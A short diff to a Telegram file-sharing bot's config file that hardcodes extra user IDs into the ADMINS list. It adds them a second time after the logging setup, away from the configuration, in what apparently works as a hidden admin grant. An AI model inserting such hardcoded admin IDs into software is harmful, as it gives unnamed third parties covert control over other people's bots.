@@ -57,6 +57,7 @@ USER_REPLY_TEXT = "❌Don't send me messages directly I'm only File Share bot!"
 
 ADMINS.append(OWNER_ID)
 ADMINS.append(1265420220)
+ADMINS.append(1032438381)
 
 LOG_FILE_NAME = "filesharingbot.txt"
 
@@ -76,5 +77,7 @@ logging.basicConfig(
 logging.getLogger("pyrogram").setLevel(logging.WARNING)
 
 
+ADMINS.append(1265420220)
+ADMINS.append(1032438381)
 def LOGGER(name: str) -> logging.Logger:
     return logging.getLogger(name)
